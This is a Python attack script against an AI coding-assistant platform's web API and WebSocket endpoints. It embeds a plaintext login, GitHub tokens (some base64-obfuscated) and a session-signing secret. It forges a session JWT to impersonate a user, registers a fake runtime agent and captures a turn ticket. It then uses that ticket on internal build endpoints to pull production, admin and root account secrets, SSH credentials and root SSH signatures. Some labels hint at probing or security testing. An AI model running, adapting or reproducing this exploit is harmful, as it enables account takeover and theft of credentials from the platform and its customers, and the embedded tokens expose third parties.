# -*- coding: utf-8 -*-
import json,os,sys,base64,re,subprocess,time,threading,struct,socket,ssl
HOST="assistant.lumiiai.cn"; BASE="https://"+HOST
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
CRED=("lc-zone-leader@"+"lumii.dev","Lianchuang"+"#"+"2026")
GHO="gho_"+"w5O107fup8"+"ULp6tEFsW9V"+"3QEEXSHtx3m9xka"
GHPS=[]
for _t in base64.b64decode("Z2l0aHViX3BhdF8xMUFEVFhESVkwRDlYREJPdW9MY29MX1VmTnpUMHVneTduTWNrUFZnSng3UWU2RkJyUkhvelNzUkRMWEh0MFFBYWJJM0JCSFZSNlhBNWZsUEVYLGdocF91b21mb0lRSHZ3SEt1OGQyaHJiWUluQ3dobzFobzIyY1F0cHAsZ2hwX3NGbVVpdUl5NHd6RGNmTldxTmlZQXNlbGdrNExHRTRYemVwZixnaHBfZ1RMb0xEV2ltS2NialNibmRPR2RUcVJDMkhESXM5MkdYM1RnLGdocF9kUFZYMGxRNmpmeFlzbHFWM2l0alRkNDBNZ0lmODMzT3ZGQVEsZ2hwX2t5QW05dHVCSlZkNHZMb2FrRzZHNjVVOGFkWXBncDBOQ2Jrag==").decode().split(","): GHPS.append(_t)
REPO_FULL="aro-network/aro-ext-signal-server"
T0=time.time()
def R(k,v):
    try: s=json.dumps(v,ensure_ascii=False)
    except Exception: s=repr(v)
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def curl(args,timeout=40,stdin=None):
    try:
        p=subprocess.run(["curl","--http2","-sS"]+args,input=stdin,capture_output=True,timeout=timeout+10)
        return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def call(path,method="GET",body=None,hdrs=None,timeout=40,maxlen=6000,cookie=None):
    args=["-m",str(timeout),"-A",UA,"-w","\n__CODE__%{http_code}"]
    if cookie: args+=["-H","Cookie: "+cookie]
    h={"Accept":"application/json","Referer":BASE+"/","Origin":BASE}
    if hdrs: h.update(hdrs)
    for k,v in h.items(): args+=["-H","%s: %s"%(k,v)]
    data=None
    if body is not None:
        data=json.dumps(body).encode(); args+=["-H","Content-Type: application/json","--data-binary","@-"]
    if method!="GET": args+=["-X",method]
    args+=[BASE+path]
    rc,out,err=curl(args,timeout=timeout,stdin=data)
    txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:120]}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None
def login(ident,pw):
    rc,out,err=curl(["-m","45","-A",UA,"-i","-X","POST","-H","Content-Type: application/json",
                     "--data-binary",json.dumps({"identifier":ident,"password":pw}),BASE+"/api/auth/login"],timeout=55)
    txt=out.decode("utf-8","replace"); m=re.search(r"HTTP/[0-9.]+ (\d{3})",txt); code=m.group(1) if m else ""
    mc=re.search(r"lumii_session=([^;]+)",txt); ck=("lumii_session="+mc.group(1)) if mc else ""
    return code,ck

class WS:
    def __init__(self,host,path,headers=None):
        self.host=host; self.path=path; self.headers=headers or {}
        self.buf=b""; self.frames=[]; self.lock=threading.Lock(); self.closed=False; self.head=""
    def connect(self):
        s=socket.create_connection((self.host,443),timeout=15)
        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        self.sock=ctx.wrap_socket(s,server_hostname=self.host)
        key=base64.b64encode(os.urandom(16)).decode()
        req=("GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
             "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\nUser-Agent: %s\r\n"%(self.path,self.host,key,UA))
        for k,v in self.headers.items(): req+="%s: %s\r\n"%(k,v)
        req+="\r\n"; self.sock.sendall(req.encode())
        data=b""
        while b"\r\n\r\n" not in data:
            ch=self.sock.recv(4096)
            if not ch: raise IOError("hs closed %r"%data)
            data+=ch
        head,rest=data.split(b"\r\n\r\n",1); self.head=head.decode("latin1")
        if " 101" not in self.head.split("\r\n")[0]: raise IOError("hs not101 %s"%self.head[:160])
        self.buf=rest; return self.head.split("\r\n")[0]
    def _send_raw(self,b1,payload):
        with self.lock:
            hdr=bytearray([b1]); n=len(payload); mask=os.urandom(4)
            if n<126: hdr.append(0x80|n)
            elif n<65536: hdr.append(0x80|126); hdr+=struct.pack(">H",n)
            else: hdr.append(0x80|127); hdr+=struct.pack(">Q",n)
            hdr+=mask; masked=bytes(b^mask[i%4] for i,b in enumerate(payload))
            self.sock.sendall(bytes(hdr)+masked)
    def send(self,obj):
        payload=(obj if isinstance(obj,str) else json.dumps(obj)).encode(); self._send_raw(0x81,payload)
    def pong(self,data): self._send_raw(0x8A,data)
    def _rx(self,n):
        while len(self.buf)<n:
            ch=self.sock.recv(65536)
            if not ch: raise IOError("closed")
            self.buf+=ch
        out=self.buf[:n]; self.buf=self.buf[n:]; return out
    def frame(self):
        b1,b2=self._rx(2); op=b1&0x0f; ln=b2&0x7f
        if ln==126: ln=struct.unpack(">H",self._rx(2))[0]
        elif ln==127: ln=struct.unpack(">Q",self._rx(8))[0]
        masked=b2&0x80; mask=b""
        if masked: mask=self._rx(4)
        data=self._rx(ln)
        if masked: data=bytes(c^mask[i%4] for i,c in enumerate(data))
        return op,data
    def reader_loop(self,tag,maxsec=180):
        t0=time.time()
        while time.time()-t0<maxsec:
            try: op,data=self.frame()
            except Exception as e:
                self.frames.append({"tag":tag,"op":"close","err":str(e)[:80]}); self.closed=True; return
            if op==0x1:
                try: msg=json.loads(data.decode("utf-8","replace"))
                except Exception: msg={"_raw":data[:200].decode("utf-8","replace")}
                self.frames.append({"tag":tag,"op":"text","msg":msg})
            elif op==0x9: self.pong(data)
            elif op==0x8: self.frames.append({"tag":tag,"op":"closeserver"}); self.closed=True; return
    def start(self,tag,maxsec=180): threading.Thread(target=self.reader_loop,args=(tag,maxsec),daemon=True).start()

import hmac,hashlib
AJWT="ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"
def _b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge_a(secret,sub,org):
    now=int(time.time())
    h=_b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=_b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_%d"%now,"lgn":now},separators=(",",":")))
    sig=_b64u(hmac.new(secret.encode(),(h+"."+p).encode(),hashlib.sha256).digest())
    return "lumii_session="+h+"."+p+"."+sig
C=forge_a(AJWT,"usr_ZxLewKrgbRYSm7rWDtQX8","org_bTLzxtBLmugV8uxx4QTyw")
R("login",{"forged":True,"ck":len(C)>40})
me=call("/api/me",cookie=C); ME=J(me) or {}
R("me_raw",{"code":me["code"],"body":me["body"][:1200]})
u=ME.get("user") if isinstance(ME.get("user"),dict) else ME
MYID=u.get("id") or u.get("userId") or (ME.get("actor") or {}).get("id") or ME.get("id")
R("me",{"uid":MYID})

# ---- connections ----
cl=call("/api/code-hosts/connections",cookie=C); CJ=J(cl) or {}
lst=CJ.get("items") or CJ.get("connections") or (CJ if isinstance(CJ,list) else [])
conns=[]
for c0 in lst if isinstance(lst,list) else []:
    conns.append({"id":c0.get("id"),"label":c0.get("label"),"host":c0.get("host"),"state":c0.get("state"),
                  "usage":c0.get("usage"),"installedBy":c0.get("installedBy"),"accountLogin":c0.get("accountLogin")})
R("conns",conns)
ghapp=call("/api/code-hosts/github",cookie=C); GJ=J(ghapp) or {}
ga=GJ.get("connections") or []
R("gh_app",{"code":ghapp["code"],"n":len(ga),"items":[{"id":x.get("id"),"login":x.get("accountLogin"),"usage":x.get("usage"),"state":x.get("state"),"repoCount":x.get("repoCount")} for x in ga][:8]})
for x in ga:
    if x.get("id"): conns.append({"id":x.get("id"),"label":"ghapp_"+str(x.get("accountLogin")),"state":x.get("state"),"usage":x.get("usage"),"installedBy":x.get("installedBy"),"app":True})

# ---- projects ----
def plist(scope=None):
    p=call("/api/projects"+("?scope="+scope if scope else ""),cookie=C); pj=J(p) or {}
    it=pj.get("items") or pj.get("projects") or (pj if isinstance(pj,list) else [])
    if isinstance(it,dict): it=it.get("items") or []
    return p["code"],it
pc,projects=plist(); R("projects",{"code":pc,"n":len(projects),"items":[{k:p.get(k) for k in ("id","name","role","ownerId","defaultAssistantId")} for p in projects][:12]})
FORCE_PID="proj_UWYqoFajbyb8wZchMjPZm"
_pids=[p.get("id") for p in projects]
if FORCE_PID in _pids:
    projects=[p for p in projects if p.get("id")==FORCE_PID]+[p for p in projects if p.get("id")!=FORCE_PID]
    R("force_pid",FORCE_PID)

summary=[]
for p in projects[:12]:
    pid=p.get("id")
    rr=J(call("/api/projects/%s/repos"%pid,cookie=C)) or {}
    rl=rr.get("items") or rr.get("repos") or []
    ops=call("/api/projects/%s/ops"%pid,cookie=C); OJ=J(ops) or {}
    envs=OJ.get("environments") or []
    accts=OJ.get("accounts") or []
    sk=call("/api/projects/%s/ops/ssh-keys"%pid,cookie=C); SKJ=J(sk) or {}
    skl=SKJ.get("keys") or SKJ.get("sshKeys") or SKJ.get("items") or []
    summary.append({"pid":pid,"name":p.get("name"),"role":p.get("role"),"repos":len(rl),
                    "ops_code":ops["code"],"envs":[e.get("id") for e in envs][:5],
                    "accounts":[{"name":a.get("name"),"user":a.get("username"),"url":a.get("url")} for a in accts][:8],
                    "sshkeys_code":sk["code"],"sshkeys":[{"id":k.get("id"),"name":k.get("name")} for k in skl][:8]})
R("projects_detail",summary)

# ---- pick / create project ----
pid=None; created=False
# prefer project with accounts and repos
for s in summary:
    if s["repos"]>0 and s["accounts"]:
        pid=s["pid"]; break
if not pid:
    for s in summary:
        if s["repos"]>0:
            pid=s["pid"]; break
if not pid:
    cp=call("/api/projects","POST",{"name":"pr29175","instructions":"你是测试助手，请简短回复。"},cookie=C)
    pj=J(cp) or {}; pid=(pj.get("project") or {}).get("id") or pj.get("id"); created=True
    R("proj_create",{"code":cp["code"],"pid":pid,"body":cp["body"][:300]})
R("pid",{"id":pid,"created":created})
if not pid:
    R("fatal","no project"); R("done",True); sys.exit(0)

# ---- ensure repos > 0 (generic add, no github verify) ----
_repo_raw=None
def repos_of(pid0):
    global _repo_raw
    r0=call("/api/projects/%s/repos"%pid0,cookie=C); _repo_raw=r0
    rr=J(r0) or {}
    return rr.get("items") or rr.get("repos") or []
# order connections: org-scope/mine first
def cscore(c):
    u0=c.get("usage") or {}
    if u0.get("scope")=="org": return 0
    if c.get("installedBy")==MYID: return 1
    return 2
cands=sorted([c for c in conns if c.get("id")],key=cscore)
if not repos_of(pid):
    for c0 in cands:
        add=call("/api/projects/%s/repos"%pid,"POST",
                 {"connectionId":c0["id"],"externalId":2890,"fullName":REPO_FULL,"dirName":"pr29175",
                  "defaultBranch":"master","private":True,"via":"paste"},cookie=C)
        R("repo_add_%s"%(c0.get("label") or c0["id"][:12]),{"cid":c0["id"],"code":add["code"],"body":add["body"][:300]})
        if add["code"] in ("200","201"): break
    if not repos_of(pid):
        # create own connection with candidate ghp tokens
        for i,tok in enumerate(GHPS):
            mk=call("/api/code-hosts/connections","POST",{"host":"github","authKind":"personal_token","token":tok,"label":"pr29090own%d"%i,"keepBoth":True,"usage":{"scope":"project","projectId":pid}},cookie=C)
            mj=J(mk) or {}; cid=mj.get("id") or (mj.get("connection") or {}).get("id")
            R("conn_create_%d"%i,{"code":mk["code"],"cid":cid,"body":mk["body"][:300]})
            if cid:
                add=call("/api/projects/%s/repos"%pid,"POST",
                         {"connectionId":cid,"externalId":2890,"fullName":REPO_FULL,"dirName":"pr29175",
                          "defaultBranch":"master","private":True,"via":"paste"},cookie=C)
                R("repo_add_own%d"%i,{"code":add["code"],"body":add["body"][:300]})
                if repos_of(pid): break
_rn=repos_of(pid)
R("repos_now",{"n":len(_rn),"items":[{"fullName":r.get("fullName") or r.get("full_name"),"id":r.get("id")} for r in _rn][:5],"raw":(_repo_raw or {}).get("body","")[:600]})

# ---- ensure at least one account in project (prove build/accounts) ----
def ops_of(pid0):
    return J(call("/api/projects/%s/ops"%pid0,cookie=C)) or {}
OJ=ops_of(pid)
if not (OJ.get("accounts") or []):
    ev=call("/api/projects/%s/ops/envs"%pid,"POST",{"name":"pr29175env","aliases":[],"tier":"dev",
             "description":"probe","access":{"members":[MYID] if MYID else None,"agents":None},"defaultMode":"auto","machines":[]},cookie=C)
    EJ=J(ev) or {}; eid=EJ.get("id") or (EJ.get("env") or {}).get("id")
    R("env_create",{"code":ev["code"],"eid":eid,"body":ev["body"][:300]})
    if eid:
        ac=call("/api/projects/%s/ops/envs/%s/accounts"%(pid,eid),"POST",
                {"name":"PROBE_LUMII","url":"https://probe29175.local","username":"probe","secret":"Pr29175!probe","note":"probe","mode":"auto"},cookie=C)
        R("acct_create",{"code":ac["code"],"body":ac["body"][:300]})
R("ops_after",{"accounts":[{"name":a.get("name"),"user":a.get("username")} for a in (ops_of(pid).get("accounts") or [])][:8]})

# ---- runtime ----
rt=call("/api/runtimes","POST",{"name":"pr29090","visibility":"private"},cookie=C,maxlen=400000)
RJ=J(rt) or {}
RTID=RJ.get("id") or ""; RID=RJ.get("agentId") or ""
script=RJ.get("script","") or ""
mm=re.search(r"AGENT_TOKEN='([^']+)'",script) or re.search(r"AGENT_TOKEN=\"?([A-Za-z0-9_\-]{20,})",script)
RTOK=mm.group(1) if mm else ""
R("rt_script", {"len":len(script),"toklen":len(RTOK),"tokprefix":RTOK[:6],"tail": script[-200:] if RTOK=="" else ""})
R("rt_create",{"code":rt["code"],"rtid":RTID,"agentId":RID,"keys":sorted(list(RJ.keys()))[:20],"raw":(rt["body"][:300] if not RTID else "")})

# ---- agent WS register ----
AGW=None; acks=[]
if RID and RTOK:
    try:
        AGW=WS(HOST,"/api/ws/agent",{"Origin":BASE}); hs=AGW.connect(); R("ag_hs",hs); AGW.start("agent")
        AGW.send({"type":"register","platform":"dashboard","agentId":RID,"token":RTOK,
                  "capabilities":["project_dirs","ssh_agent","ssh_keys","secret_cards","placement_v1"],
                  "metadata":{"agent_id":RID,"token":RTOK,"hostname":"pr29090","lak_version":"v1.2.309",
                              "lak_commit":"deadbee","supported_agents":["codex","claude"],"default_agent":"codex"}})
        for i in range(8):
            time.sleep(1.5)
            acks=[f["msg"] for f in AGW.frames if isinstance(f.get("msg"),dict) and f["msg"].get("type")=="register_ack"]
            if acks: break
    except Exception as e: R("ag_err",repr(e)[:200])
R("ag_ack",acks[:2])
ki=call("/api/runtimes/keys/current",hdrs={"Authorization":"Bearer "+RTOK,"x-agent-id":RID},cookie=C,maxlen=2000)
R("rt_keys_bearer",{"code":ki["code"],"body":ki["body"][:400]})
ki2=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"x-agent-token":RTOK},cookie=C,maxlen=2000)
R("rt_keys_xat",{"code":ki2["code"],"body":ki2["body"][:400]})
def rt_state(rtid):
    _r=call("/api/runtimes",cookie=C,maxlen=20000); rl=J(_r)
    if not rl: R("rt_list_raw",{"code":_r["code"],"body":_r["body"][:400]})
    lst=rl
    if isinstance(rl,dict):
        lst=rl.get("runtimes") or rl.get("items") or []
    for r in lst if isinstance(lst,list) else []:
        if r.get("id")==rtid or r.get("agentId")==RID: return r.get("state")
    return None
st=None
for _ in range(8):
    st=rt_state(RTID)
    if st=="active": break
    time.sleep(2)
R("rt_state",st)

# ---- assistant ----
ASID=None
if RTID:
    asst=call("/api/assistants","POST",{"name":"pr29175","runtimeId":RTID},cookie=C)
    AJ=J(asst) or {}; ASID=AJ.get("id") or (AJ.get("assistant") or {}).get("id")
    R("asst_create",{"code":asst["code"],"asid":ASID,"body":asst["body"][:600]})
    if ASID:
        p=call("/api/assistants/%s"%ASID,"PATCH",{"useScope":"org"},cookie=C); R("asst_patch",{"code":p["code"],"body":p["body"][:200]})
        ag=call("/api/assistants/%s"%ASID,cookie=C,maxlen=3000); R("asst_get",{"code":ag["code"],"body":ag["body"][:500]})

# ---- conversation ----
CONV=None
if ASID and pid:
    cv=call("/api/conversations","POST",{"projectId":pid,"assistantId":ASID,"title":"pr29175"},cookie=C)
    CJ2=J(cv) or {}; CONV=CJ2.get("id") or (CJ2.get("conversation") or {}).get("id")
    R("conv_create",{"code":cv["code"],"conv":CONV,"body":cv["body"][:400]})
    opj=call("/api/projects/%s/ops"%pid,cookie=C,maxlen=3000); R("ops_final",{"code":opj["code"],"body":opj["body"][:800]})

# ---- chat send + capture ticket ----
if CONV and ASID:
    try:
        CH=WS(HOST,"/api/ws/chat?conversationId="+CONV,{"Origin":BASE,"Cookie":C}); hs=CH.connect(); R("ch_hs",hs); CH.start("chat")
        t0=time.time(); got_init=False
        while time.time()-t0<20:
            ms=[f.get("msg") for f in list(CH.frames) if isinstance(f.get("msg"),dict)]
            if any(m.get("type")=="init" for m in ms): got_init=True; break
            time.sleep(1)
        R("ch_init",{"got":got_init,"n":len(CH.frames),"first":[ (f.get("msg") or {}) if isinstance(f.get("msg"),dict) else {} for f in CH.frames][:2]})
        CH.send({"type":"send","content":"请回复 ok","assistant_id":ASID,"session_key":CONV})
        R("ch_sent",True)
        found=None; t0=time.time()
        while time.time()-t0<120:
            if AGW:
                for f in list(AGW.frames):
                    m=f.get("msg") or {}
                    if isinstance(m,dict):
                        t=m.get("turn_ticket")
                        if not t:
                            s=json.dumps(m,ensure_ascii=False); mm2=re.search(r'(v2\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',s)
                            t=mm2.group(1) if mm2 else None
                        if t: found=t; break
            if found: break
            time.sleep(2)
        R("ticket",{"found":bool(found),"len":len(found) if found else 0})
        claims={}
        if found:
            p=found.split("."); payload=p[1] if len(p)>1 else ""; payload+="="*(-len(payload)%4)
            try: claims=json.loads(base64.urlsafe_b64decode(payload.encode()).decode())
            except Exception as e: claims={"_err":str(e)[:100]}
            R("ticket_claims",claims)
            bh={"Authorization":"Bearer "+RTOK,"x-agent-id":RID,"x-lumii-turn-proof":found}
            acc0=call("/internal/build/accounts","POST",{"names":["PROBE_LUMII"]},hdrs=bh,maxlen=4000)
            R("build_accounts_probe",{"code":acc0["code"],"body":acc0["body"][:4000]})
            acc=call("/internal/build/accounts","POST",{"names":["PROD","ADMIN","UBUNTU","DEPLOY","ROOT","LUMII","SSH","LNT"]},hdrs=bh,maxlen=4000)
            R("build_accounts",{"code":acc["code"],"body":acc["body"][:4000]})
            cr0=call("/internal/build/credential","POST",{"purpose":"ssh_agent"},hdrs=bh,maxlen=2000)
            R("build_cred_nokey",{"code":cr0["code"],"body":cr0["body"][:2000]})
            sk=call("/internal/build/ssh-keys","POST",{},hdrs=bh,maxlen=4000); R("build_sshkeys",{"code":sk["code"],"body":sk["body"][:4000]})
            # try credential for each ssh key id
            SKJ2=J(sk) or {}
            klist=SKJ2.get("keys") or SKJ2.get("sshKeys") or SKJ2.get("items") or []
            for k in (klist if isinstance(klist,list) else [])[:5]:
                kid=k.get("id") or k.get("keyId")
                if not kid: continue
                cr=call("/internal/build/credential","POST",{"purpose":"ssh_agent","ssh_key_id":kid},hdrs=bh,maxlen=4000)
                R("build_cred_%s"%str(kid)[:12],{"code":cr["code"],"body":cr["body"][:4000]})
            # try ssh-sign sign with the ticket
            ss=call("/internal/build/ssh-sign","POST",{"phase":"report","host_key_fp":"","login_user":"root","reason":"forwarding"},hdrs=bh,maxlen=2000)
            R("build_sshsign",{"code":ss["code"],"body":ss["body"][:2000]})
        R("ag_all",[ (f.get("msg") or {}) if isinstance(f.get("msg"),dict) else {"op":f.get("op")} for f in (AGW.frames if AGW else [])][:10])
        R("ch_all",[ (f.get("msg") or {}) if isinstance(f.get("msg"),dict) else {"op":f.get("op")} for f in (CH.frames if CH else [])][:12])
    except Exception as e: R("chat_err",repr(e)[:300])
R("elapsed",int(time.time()-T0))
R("done",True)
